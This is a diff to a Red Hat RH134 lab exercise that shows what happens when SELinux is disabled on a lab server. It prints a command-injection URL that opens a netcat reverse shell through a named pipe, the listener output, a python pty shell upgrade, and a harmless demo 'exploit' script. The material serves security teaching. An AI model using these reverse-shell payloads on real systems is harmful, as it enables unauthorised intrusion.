@@ -2,7 +2,7 @@
 * Extra Practice for RH134 Training - RHEL 8.2 Admin II
   >> To run on Redhat RH134 Lab Systems!
 
-### Scenario: We going to the see effects of SElinux in ServerA/B 
+### Scenario: We going to the see effects of turning off/disabled SElinux on ServerA
 
 ### Part1: Instruction - run in servera or serverb ( choose 1 ) and run as user root
   >> We assume its servera 
@@ -95,3 +95,50 @@ http://servera.lab.example.com/index.php?cmd=/bin/sh 0</var/tmp/backpipe1 | nc w
 
 
 ```
+
+4. Check the terminal where the nc listener running and open a shell 
+you should receive a connection from servera ( 172.25.250.10 )
+
+```sh 
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 172.25.250.10.
+Ncat: Connection from 172.25.250.10:54496.
+```
+
+Run the following command to create a shell 
+
+```sh 
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+You should receive a shell
+```sh 
+sh-4.4$ 
+```
+
+5. If Step 4 done, you now have a reverse shell (hacked shell) to servera from workstation 
+run the following command to create a exploit file and run the exploit 
+>> the exploit file is just an shell script, in real life, an attacker could run a real exploit !!
+```sh
+sh-4.4$ cd /tmp
+
+sh-4.4$ echo "echo OWN3D_servera" > ex.sh
+
+sh-4.4$ cat ex.sh
+echo OWN3D_servera
+
+sh-4.4$ chmod +x ex.sh
+
+sh-4.4$ ls -l ex.sh
+-rwxrwxrwx. 1 apache apache 19 Mar 22 09:25 ex.sh
+
+sh-4.4$ ./ex.sh
+OWN3D_servera
+
+sh-4.4$
+
+```
+
+
